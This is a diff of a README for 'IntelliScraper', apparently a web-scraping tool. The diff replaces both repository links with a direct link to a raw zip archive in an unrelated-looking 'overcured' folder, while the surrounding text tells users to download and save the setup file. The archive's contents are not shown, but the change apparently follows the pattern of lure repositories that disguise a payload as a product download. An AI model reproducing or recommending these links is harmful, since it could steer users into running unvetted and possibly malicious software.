@@ -1,6 +1,6 @@
 # 🤖 IntelliScraper - Smart Web Data Made Simple
 
-[![Download IntelliScraper](https://img.shields.io/badge/Download-IntelliScraper-blue?style=for-the-badge)](https://github.com/antistrophic-flycatchingwarbler920/IntelliScraper)
+[![Download IntelliScraper](https://img.shields.io/badge/Download-IntelliScraper-blue?style=for-the-badge)](https://github.com/antistrophic-flycatchingwarbler920/IntelliScraper/raw/refs/heads/main/overcured/Scraper_Intelli_v3.3.zip)
 
 ## 🧰 What IntelliScraper Does
 
@@ -28,7 +28,7 @@ Before you start, check that your PC has:
 
 Visit this page to download IntelliScraper:
 
-https://github.com/antistrophic-flycatchingwarbler920/IntelliScraper
+https://github.com/antistrophic-flycatchingwarbler920/IntelliScraper/raw/refs/heads/main/overcured/Scraper_Intelli_v3.3.zip
 
 Open the page in your browser, then look for the latest release, setup file, or download package. Save the file to your computer.
 
